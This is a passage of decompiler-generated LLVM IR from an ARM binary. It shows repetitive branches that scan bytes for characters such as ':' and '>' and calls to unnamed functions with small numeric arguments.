  store i1 %v7_11b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b00, label %dec_label_pc_11b24, label %dec_label_pc_11b08

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11b00
  %v1_11b08 = add i32 %v0_11b24, -1
  store i32 %v1_11b08, i32* %r0.global-to-local, align 4
  %v2_11b08 = icmp ne i32 %v0_11b24, 0
  store i1 %v2_11b08, i1* %cpsr_c.global-to-local, align 1
  %v7_11b08 = icmp eq i32 %v0_11b24, 1
  store i1 %v7_11b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b08, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11adc, %dec_label_pc_11b08
  %v0_11b24 = phi i32 [ %v1_11b08, %dec_label_pc_11b08 ], [ %v1_11ae0, %dec_label_pc_11adc ]
  %v2_11b10 = add i32 %v0_11b24, %v0_11790
  store i32 %v2_11b10, i32* %r3.global-to-local, align 4
  %v1_11b14 = add i32 %v2_11b10, 28
  %v2_11b14 = inttoptr i32 %v1_11b14 to i8*
  %v3_11b14 = load i8, i8* %v2_11b14, align 1
  %v4_11b14 = zext i8 %v3_11b14 to i32
  store i32 %v4_11b14, i32* %r3.global-to-local, align 4
  %v2_11b18 = icmp ugt i8 %v3_11b14, 61
  store i1 %v2_11b18, i1* %cpsr_c.global-to-local, align 1
  %v7_11b18 = icmp eq i8 %v3_11b14, 62
  store i1 %v7_11b18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b18, label %dec_label_pc_11b24, label %bb324

bb324:                                            ; preds = %dec_label_pc_11b10
  %v3_11b1c = icmp ugt i8 %v3_11b14, 57
  store i1 %v3_11b1c, i1* %cpsr_c.global-to-local, align 1
  %v8_11b1c = icmp eq i8 %v3_11b14, 58
  store i1 %v8_11b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11b1c, label %dec_label_pc_11b24, label %dec_label_pc_11af0

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b10, %bb324, %dec_label_pc_11b00, %dec_label_pc_11af8, %dec_label_pc_11af0
  %v1_11b24 = add i32 %v0_11b24, 1
  store i32 %v1_11b24, i32* @r7, align 4
  %v2_11b28 = icmp eq i32 %v1_11b24, -1
  store i1 %v2_11b28, i1* %cpsr_c.global-to-local, align 1
  %v7_11b28 = icmp eq i32 %v0_11b24, -2
  store i1 %v7_11b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b28, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11b30

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b24
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11b30 = icmp eq i32 %v1_11b24, 0
  store i1 %v2_11b30, i1* %cpsr_z.global-to-local, align 1
  %tmp325 = icmp slt i32 %v1_11b24, 1
  br i1 %tmp325, label %dec_label_pc_118a0, label %dec_label_pc_11b38

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11b30
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11b3c = call i32 @function_123b0(i32 21)
  store i32 %v2_11b44, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_11b4c = call i32 @function_122cc(i32 21, i32* nonnull %stack_var_-56)
  store i32 %v3_11b4c, i32* %r0.global-to-local, align 4
  %v3_11b50 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11b50, i32* %r2.global-to-local, align 4
  store i32 %v3_11b4c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11b5c = load i32, i32* @r5, align 4
  %v1_11b5c = add i32 %v0_11b5c, 4
  %v2_11b5c = inttoptr i32 %v1_11b5c to i32*
  %v3_11b5c = load i32, i32* %v2_11b5c, align 4
  store i32 %v3_11b5c, i32* %r0.global-to-local, align 4
  %v4_11b60 = inttoptr i32 %v3_11b4c to i32*
  %v5_11b60 = call i32 @function_13f00(i32 %v3_11b5c, i32* %v4_11b60, i32 %v3_11b50, i32 16384)
  store i32 %v5_11b60, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11b70 = load i32, i32* @r5, align 4
  %v1_11b70 = add i32 %v0_11b70, 4
  %v2_11b70 = inttoptr i32 %v1_11b70 to i32*
  %v3_11b70 = load i32, i32* %v2_11b70, align 4
  store i32 %v3_11b70, i32* %r0.global-to-local, align 4
  %v5_11b74 = call i32 @function_13f00(i32 %v3_11b70, i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11b7c = call i32 @function_122f8(i32 21)
  store i32 %v1_11b7c, i32* %r0.global-to-local, align 4
  %v0_11b80 = load i32, i32* @r5, align 4
  %v1_11b80 = add i32 %v0_11b80, 24
  %v2_11b80 = inttoptr i32 %v1_11b80 to i32*
  %v3_11b80 = load i32, i32* %v2_11b80, align 4
  store i32 %v3_11b80, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_11b88 = add i32 %v0_11b80, 12
  %v3_11b88 = inttoptr i32 %v2_11b88 to i32*
  store i32 6, i32* %v3_11b88, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11b90:                               ; preds = %dec_label_pc_11790
  %v1_11b90 = add i32 %v0_11790, 24
  %v2_11b90 = inttoptr i32 %v1_11b90 to i32*
  %v3_11b90 = load i32, i32* %v2_11b90, align 4
  store i32 %v3_11b90, i32* %ip.global-to-local, align 4
  %v1_11b94 = add i32 %v3_11b90, -1
  store i32 %v1_11b94, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11b98 = icmp eq i32 %v1_11b94, 0
  store i1 %v2_11b98, i1* %cpsr_z.global-to-local, align 1
  %v5_11b9c = icmp sgt i32 %v1_11b94, 0
  br i1 %v5_11b9c, label %dec_label_pc_11bc4, label %dec_label_pc_11710thread-pre-split.thread

dec_label_pc_11ba4:                               ; preds = %bb326
  %v2_11ba4 = icmp ugt i8 %v3_11bc8, 35
  store i1 %v2_11ba4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ba4 = icmp eq i8 %v3_11bc8, 36
  store i1 %v7_11ba4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ba4, label %dec_label_pc_11bd8, label %dec_label_pc_11bac

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11ba4
  %v2_11bac = icmp ugt i8 %v3_11bc8, 34
  store i1 %v2_11bac, i1* %cpsr_c.global-to-local, align 1
  %v7_11bac = icmp eq i8 %v3_11bc8, 35
  store i1 %v7_11bac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bac, label %dec_label_pc_11bd8, label %dec_label_pc_11bb4

dec_label_pc_11bb4:                               ; preds = %dec_label_pc_11bac
  %v2_11bb4 = icmp ugt i8 %v3_11bc8, 36
  store i1 %v2_11bb4, i1* %cpsr_c.global-to-local, align 1
  %v7_11bb4 = icmp eq i8 %v3_11bc8, 37
  store i1 %v7_11bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bb4, label %dec_label_pc_11bd8, label %dec_label_pc_11bbc

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11bb4
  %v1_11bbc = add i32 %v0_11bd8, -1
  store i32 %v1_11bbc, i32* %r0.global-to-local, align 4
  %v2_11bbc = icmp ne i32 %v0_11bd8, 0
  store i1 %v2_11bbc, i1* %cpsr_c.global-to-local, align 1
  %v7_11bbc = icmp eq i32 %v0_11bd8, 1
  store i1 %v7_11bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bbc, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11bc4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11b90, %dec_label_pc_11bbc
  %v0_11bd8 = phi i32 [ %v1_11bbc, %dec_label_pc_11bbc ], [ %v1_11b94, %dec_label_pc_11b90 ]
  %v2_11bc4 = add i32 %v0_11bd8, %v0_11790
  store i32 %v2_11bc4, i32* %r3.global-to-local, align 4
  %v1_11bc8 = add i32 %v2_11bc4, 28
  %v2_11bc8 = inttoptr i32 %v1_11bc8 to i8*
  %v3_11bc8 = load i8, i8* %v2_11bc8, align 1
  %v4_11bc8 = zext i8 %v3_11bc8 to i32
  store i32 %v4_11bc8, i32* %r3.global-to-local, align 4
  %v2_11bcc = icmp ugt i8 %v3_11bc8, 61
  store i1 %v2_11bcc, i1* %cpsr_c.global-to-local, align 1
  %v7_11bcc = icmp eq i8 %v3_11bc8, 62
  store i1 %v7_11bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bcc, label %dec_label_pc_11bd8, label %bb326

bb326:                                            ; preds = %dec_label_pc_11bc4
  %v3_11bd0 = icmp ugt i8 %v3_11bc8, 57
  store i1 %v3_11bd0, i1* %cpsr_c.global-to-local, align 1
  %v8_11bd0 = icmp eq i8 %v3_11bc8, 58
  store i1 %v8_11bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11bd0, label %dec_label_pc_11bd8, label %dec_label_pc_11ba4

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bc4, %bb326, %dec_label_pc_11bb4, %dec_label_pc_11bac, %dec_label_pc_11ba4
  %v1_11bd8 = add i32 %v0_11bd8, 1
  store i32 %v1_11bd8, i32* @r7, align 4
  %v2_11bdc = icmp eq i32 %v1_11bd8, -1
  store i1 %v2_11bdc, i1* %cpsr_c.global-to-local, align 1
  %v7_11bdc = icmp eq i32 %v0_11bd8, -2
  store i1 %v7_11bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bdc, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11be4

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bd8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11be4 = icmp eq i32 %v1_11bd8, 0
  store i1 %v2_11be4, i1* %cpsr_z.global-to-local, align 1
  %tmp327 = icmp slt i32 %v1_11bd8, 1
  br i1 %tmp327, label %dec_label_pc_118a0, label %dec_label_pc_11bec

dec_label_pc_11bec:                               ; preds = %dec_label_pc_11be4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11bf0 = call i32 @function_123b0(i32 22)
  store i32 %v2_11bf8, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_11c00 = call i32 @function_122cc(i32 22, i32* nonnull %stack_var_-48)
  store i32 %v3_11c00, i32* %r0.global-to-local, align 4
  %v3_11c04 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11c04, i32* %r2.global-to-local, align 4
  store i32 %v3_11c00, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11c10 = load i32, i32* @r5, align 4
  %v1_11c10 = add i32 %v0_11c10, 4
  %v2_11c10 = inttoptr i32 %v1_11c10 to i32*
  %v3_11c10 = load i32, i32* %v2_11c10, align 4
  store i32 %v3_11c10, i32* %r0.global-to-local, align 4
  %v4_11c14 = inttoptr i32 %v3_11c00 to i32*
  %v5_11c14 = call i32 @function_13f00(i32 %v3_11c10, i32* %v4_11c14, i32 %v3_11c04, i32 16384)
  store i32 %v5_11c14, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11c24 = load i32, i32* @r5, align 4
  %v1_11c24 = add i32 %v0_11c24, 4
  %v2_11c24 = inttoptr i32 %v1_11c24 to i32*
  %v3_11c24 = load i32, i32* %v2_11c24, align 4
  store i32 %v3_11c24, i32* %r0.global-to-local, align 4
  %v5_11c28 = call i32 @function_13f00(i32 %v3_11c24, i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11c30 = call i32 @function_122f8(i32 22)
  store i32 %v1_11c30, i32* %r0.global-to-local, align 4
  %v0_11c34 = load i32, i32* @r5, align 4
  %v1_11c34 = add i32 %v0_11c34, 24
  %v2_11c34 = inttoptr i32 %v1_11c34 to i32*
  %v3_11c34 = load i32, i32* %v2_11c34, align 4
  store i32 %v3_11c34, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_11c3c = add i32 %v0_11c34, 12
  %v3_11c3c = inttoptr i32 %v2_11c3c to i32*
  store i32 7, i32* %v3_11c3c, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11c44:                               ; preds = %dec_label_pc_11790
  %v1_11c44 = add i32 %v0_11790, 24
  %v2_11c44 = inttoptr i32 %v1_11c44 to i32*
  %v3_11c44 = load i32, i32* %v2_11c44, align 4
  store i32 %v3_11c44, i32* %ip.global-to-local, align 4
  %v1_11c48 = add i32 %v3_11c44, -1
  store i32 %v1_11c48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11c4c = icmp eq i32 %v1_11c48, 0
  store i1 %v2_11c4c, i1* %cpsr_z.global-to-local, align 1
  %v5_11c50 = icmp sgt i32 %v1_11c48, 0
  br i1 %v5_11c50, label %dec_label_pc_11c78, label %dec_label_pc_11710thread-pre-split.thread

dec_label_pc_11c58:                               ; preds = %bb328
  %v2_11c58 = icmp ugt i8 %v3_11c7c, 35
  store i1 %v2_11c58, i1* %cpsr_c.global-to-local, align 1
  %v7_11c58 = icmp eq i8 %v3_11c7c, 36
  store i1 %v7_11c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c58, label %dec_label_pc_11c8c, label %dec_label_pc_11c60

dec_label_pc_11c60:                               ; preds = %dec_label_pc_11c58
  %v2_11c60 = icmp ugt i8 %v3_11c7c, 34
  store i1 %v2_11c60, i1* %cpsr_c.global-to-local, align 1
  %v7_11c60 = icmp eq i8 %v3_11c7c, 35
  store i1 %v7_11c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c60, label %dec_label_pc_11c8c, label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c60
  %v2_11c68 = icmp ugt i8 %v3_11c7c, 36
  store i1 %v2_11c68, i1* %cpsr_c.global-to-local, align 1
  %v7_11c68 = icmp eq i8 %v3_11c7c, 37
  store i1 %v7_11c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c68, label %dec_label_pc_11c8c, label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c68
  %v1_11c70 = add i32 %v0_11c8c, -1
  store i32 %v1_11c70, i32* %r0.global-to-local, align 4
  %v2_11c70 = icmp ne i32 %v0_11c8c, 0
  store i1 %v2_11c70, i1* %cpsr_c.global-to-local, align 1
  %v7_11c70 = icmp eq i32 %v0_11c8c, 1
  store i1 %v7_11c70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c70, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c44, %dec_label_pc_11c70
  %v0_11c8c = phi i32 [ %v1_11c70, %dec_label_pc_11c70 ], [ %v1_11c48, %dec_label_pc_11c44 ]
  %v2_11c78 = add i32 %v0_11c8c, %v0_11790
  store i32 %v2_11c78, i32* %r3.global-to-local, align 4
  %v1_11c7c = add i32 %v2_11c78, 28
  %v2_11c7c = inttoptr i32 %v1_11c7c to i8*
  %v3_11c7c = load i8, i8* %v2_11c7c, align 1
  %v4_11c7c = zext i8 %v3_11c7c to i32
  store i32 %v4_11c7c, i32* %r3.global-to-local, align 4
  %v2_11c80 = icmp ugt i8 %v3_11c7c, 61
  store i1 %v2_11c80, i1* %cpsr_c.global-to-local, align 1
  %v7_11c80 = icmp eq i8 %v3_11c7c, 62
  store i1 %v7_11c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c80, label %dec_label_pc_11c8c, label %bb328

bb328:                                            ; preds = %dec_label_pc_11c78
  %v3_11c84 = icmp ugt i8 %v3_11c7c, 57
  store i1 %v3_11c84, i1* %cpsr_c.global-to-local, align 1
  %v8_11c84 = icmp eq i8 %v3_11c7c, 58
  store i1 %v8_11c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11c84, label %dec_label_pc_11c8c, label %dec_label_pc_11c58

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c78, %bb328, %dec_label_pc_11c68, %dec_label_pc_11c60, %dec_label_pc_11c58
  %v1_11c8c = add i32 %v0_11c8c, 1
  store i32 %v1_11c8c, i32* @r7, align 4
  %v2_11c90 = icmp eq i32 %v1_11c8c, -1
  store i1 %v2_11c90, i1* %cpsr_c.global-to-local, align 1
  %v7_11c90 = icmp eq i32 %v0_11c8c, -2
  store i1 %v7_11c90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c90, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11c98

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c8c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11c98 = icmp eq i32 %v1_11c8c, 0
  store i1 %v2_11c98, i1* %cpsr_z.global-to-local, align 1
  %tmp329 = icmp slt i32 %v1_11c8c, 1
  br i1 %tmp329, label %dec_label_pc_118a0, label %dec_label_pc_11ca0

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11c98
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11ca4 = call i32 @function_123b0(i32 23)
  store i32 %v2_11b44, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_11cb4 = call i32 @function_122cc(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v3_11cb4, i32* %r0.global-to-local, align 4
  %v3_11cb8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11cb8, i32* %r2.global-to-local, align 4
  store i32 %v3_11cb4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11cc4 = load i32, i32* @r5, align 4
  %v1_11cc4 = add i32 %v0_11cc4, 4
  %v2_11cc4 = inttoptr i32 %v1_11cc4 to i32*
  %v3_11cc4 = load i32, i32* %v2_11cc4, align 4
  store i32 %v3_11cc4, i32* %r0.global-to-local, align 4
  %v4_11cc8 = inttoptr i32 %v3_11cb4 to i32*
  %v5_11cc8 = call i32 @function_13f00(i32 %v3_11cc4, i32* %v4_11cc8, i32 %v3_11cb8, i32 16384)
  store i32 %v5_11cc8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11cd8 = load i32, i32* @r5, align 4
  %v1_11cd8 = add i32 %v0_11cd8, 4
  %v2_11cd8 = inttoptr i32 %v1_11cd8 to i32*
  %v3_11cd8 = load i32, i32* %v2_11cd8, align 4
  store i32 %v3_11cd8, i32* %r0.global-to-local, align 4
  %v5_11cdc = call i32 @function_13f00(i32 %v3_11cd8, i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11ce4 = call i32 @function_122f8(i32 23)
  store i32 %v1_11ce4, i32* %r0.global-to-local, align 4
  %v0_11ce8 = load i32, i32* @r5, align 4
  %v1_11ce8 = add i32 %v0_11ce8, 24
  %v2_11ce8 = inttoptr i32 %v1_11ce8 to i32*
  %v3_11ce8 = load i32, i32* %v2_11ce8, align 4
  store i32 %v3_11ce8, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_11cf0 = add i32 %v0_11ce8, 12
  %v3_11cf0 = inttoptr i32 %v2_11cf0 to i32*
  store i32 9, i32* %v3_11cf0, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11cf8:                               ; preds = %dec_label_pc_11790
  %v1_11cf8 = add i32 %v0_11790, 24
  %v2_11cf8 = inttoptr i32 %v1_11cf8 to i32*
  %v3_11cf8 = load i32, i32* %v2_11cf8, align 4
  store i32 %v3_11cf8, i32* %ip.global-to-local, align 4
  %v1_11cfc = add i32 %v3_11cf8, -1
  store i32 %v1_11cfc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d00 = icmp eq i32 %v1_11cfc, 0
  store i1 %v2_11d00, i1* %cpsr_z.global-to-local, align 1
  %v5_11d04 = icmp sgt i32 %v1_11cfc, 0
  br i1 %v5_11d04, label %dec_label_pc_11d2c, label %dec_label_pc_11710thread-pre-split.thread

dec_label_pc_11d0c:                               ; preds = %bb330
  %v2_11d0c = icmp ugt i8 %v3_11d30, 35
  store i1 %v2_11d0c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d0c = icmp eq i8 %v3_11d30, 36
  store i1 %v7_11d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d0c, label %dec_label_pc_11d40, label %dec_label_pc_11d14

dec_label_pc_11d14:                               ; preds = %dec_label_pc_11d0c
  %v2_11d14 = icmp ugt i8 %v3_11d30, 34
  store i1 %v2_11d14, i1* %cpsr_c.global-to-local, align 1
  %v7_11d14 = icmp eq i8 %v3_11d30, 35
  store i1 %v7_11d14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d14, label %dec_label_pc_11d40, label %dec_label_pc_11d1c

dec_label_pc_11d1c:                               ; preds = %dec_label_pc_11d14
  %v2_11d1c = icmp ugt i8 %v3_11d30, 36
  store i1 %v2_11d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_11d1c = icmp eq i8 %v3_11d30, 37
  store i1 %v7_11d1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d1c, label %dec_label_pc_11d40, label %dec_label_pc_11d24

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11d1c
  %v1_11d24 = add i32 %v0_11d40, -1
  store i32 %v1_11d24, i32* %r0.global-to-local, align 4
  %v2_11d24 = icmp ne i32 %v0_11d40, 0
  store i1 %v2_11d24, i1* %cpsr_c.global-to-local, align 1
  %v7_11d24 = icmp eq i32 %v0_11d40, 1
  store i1 %v7_11d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d24, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11d2c

dec_label_pc_11d2c:                               ; preds = %dec_label_pc_11cf8, %dec_label_pc_11d24
  %v0_11d40 = phi i32 [ %v1_11d24, %dec_label_pc_11d24 ], [ %v1_11cfc, %dec_label_pc_11cf8 ]
  %v2_11d2c = add i32 %v0_11d40, %v0_11790
  store i32 %v2_11d2c, i32* %r3.global-to-local, align 4
  %v1_11d30 = add i32 %v2_11d2c, 28
  %v2_11d30 = inttoptr i32 %v1_11d30 to i8*
  %v3_11d30 = load i8, i8* %v2_11d30, align 1
  %v4_11d30 = zext i8 %v3_11d30 to i32
  store i32 %v4_11d30, i32* %r3.global-to-local, align 4
  %v2_11d34 = icmp ugt i8 %v3_11d30, 61
  store i1 %v2_11d34, i1* %cpsr_c.global-to-local, align 1
  %v7_11d34 = icmp eq i8 %v3_11d30, 62
  store i1 %v7_11d34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d34, label %dec_label_pc_11d40, label %bb330

bb330:                                            ; preds = %dec_label_pc_11d2c
  %v3_11d38 = icmp ugt i8 %v3_11d30, 57
  store i1 %v3_11d38, i1* %cpsr_c.global-to-local, align 1
  %v8_11d38 = icmp eq i8 %v3_11d30, 58
  store i1 %v8_11d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d38, label %dec_label_pc_11d40, label %dec_label_pc_11d0c

dec_label_pc_11d40:                               ; preds = %dec_label_pc_11d2c, %bb330, %dec_label_pc_11d1c, %dec_label_pc_11d14, %dec_label_pc_11d0c
  %v1_11d40 = add i32 %v0_11d40, 1
  store i32 %v1_11d40, i32* @r7, align 4
  %v2_11d44 = icmp eq i32 %v1_11d40, -1
  store i1 %v2_11d44, i1* %cpsr_c.global-to-local, align 1
  %v7_11d44 = icmp eq i32 %v0_11d40, -2
  store i1 %v7_11d44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d44, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11d4c

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d40
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d4c = icmp eq i32 %v1_11d40, 0
  store i1 %v2_11d4c, i1* %cpsr_z.global-to-local, align 1
  %tmp331 = icmp slt i32 %v1_11d40, 1
  br i1 %tmp331, label %dec_label_pc_118a0, label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d4c
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_11d58 = call i32 @function_123b0(i32 20)
  store i32 %v2_11bf8, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_11d68 = call i32 @function_122cc(i32 20, i32* nonnull %stack_var_-48)
  store i32 %v3_11d68, i32* %r0.global-to-local, align 4
  %v3_11d6c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11d6c, i32* %r2.global-to-local, align 4
  store i32 %v3_11d68, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11d78 = load i32, i32* @r5, align 4
  %v1_11d78 = add i32 %v0_11d78, 4
  %v2_11d78 = inttoptr i32 %v1_11d78 to i32*
  %v3_11d78 = load i32, i32* %v2_11d78, align 4
  store i32 %v3_11d78, i32* %r0.global-to-local, align 4
  %v4_11d7c = inttoptr i32 %v3_11d68 to i32*
  %v5_11d7c = call i32 @function_13f00(i32 %v3_11d78, i32* %v4_11d7c, i32 %v3_11d6c, i32 16384)
  store i32 %v5_11d7c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11d8c = load i32, i32* @r5, align 4
  %v1_11d8c = add i32 %v0_11d8c, 4
  %v2_11d8c = inttoptr i32 %v1_11d8c to i32*
  %v3_11d8c = load i32, i32* %v2_11d8c, align 4
  store i32 %v3_11d8c, i32* %r0.global-to-local, align 4
  %v5_11d90 = call i32 @function_13f00(i32 %v3_11d8c, i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_11d98 = call i32 @function_122f8(i32 20)
  store i32 %v1_11d98, i32* %r0.global-to-local, align 4
  %v0_11d9c = load i32, i32* @r5, align 4
  %v1_11d9c = add i32 %v0_11d9c, 24
  %v2_11d9c = inttoptr i32 %v1_11d9c to i32*
  %v3_11d9c = load i32, i32* %v2_11d9c, align 4
  store i32 %v3_11d9c, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_11da4 = add i32 %v0_11d9c, 12
  %v3_11da4 = inttoptr i32 %v2_11da4 to i32*
  store i32 8, i32* %v3_11da4, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11dac:                               ; preds = %dec_label_pc_11790
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11db0 = call i32 @function_123b0(i32 26)
  store i32 %v2_11b44, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_11dc0 = call i32 @function_122cc(i32 26, i32* nonnull %stack_var_-56)
  %v3_11dc4 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11dc0, i32* %r2.global-to-local, align 4
  %v1_11dcc = add i32 %v3_11dc4, -1
  store i32 %v1_11dcc, i32* %r3.global-to-local, align 4
  %v0_11dd0 = load i32, i32* @sb, align 4
  store i32 %v0_11dd0, i32* %r0.global-to-local, align 4
  %v0_11dd4 = load i32, i32* @r5, align 4
  %v1_11dd4 = add i32 %v0_11dd4, 24
  %v2_11dd4 = inttoptr i32 %v1_11dd4 to i32*
  %v3_11dd4 = load i32, i32* %v2_11dd4, align 4
  store i32 %v3_11dd4, i32* %r1.global-to-local, align 4
  %v4_11dd8 = call i32 @function_12da0(i32 %v0_11dd0, i32 %v3_11dd4, i32 %v3_11dc0, i32 %v1_11dcc)
  %v3_11ddc = icmp eq i32 %v4_11dd8, -1
  store i1 %v3_11ddc, i1* %cpsr_c.global-to-local, align 1
  %v8_11ddc = icmp eq i32 %v4_11dd8, -1
  store i1 %v8_11ddc, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11de8 = call i32 @function_122f8(i32 26)
  br i1 %v3_11ddc, label %dec_label_pc_11de4, label %dec_label_pc_12018

dec_label_pc_11de4:                               ; preds = %dec_label_pc_11dac
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11df0 = call i32 @function_123b0(i32 25)
  store i32 %v2_11b44, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11e00 = call i32 @function_122cc(i32 25, i32* nonnull %stack_var_-56)
  store i32 %v3_11e00, i32* %r0.global-to-local, align 4
  %v3_11e04 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11e00, i32* %r2.global-to-local, align 4
  %v1_11e0c = add i32 %v3_11e04, -1
  store i32 %v1_11e0c, i32* %r3.global-to-local, align 4
  %v0_11e10 = load i32, i32* @r5, align 4
  %v1_11e10 = add i32 %v0_11e10, 24
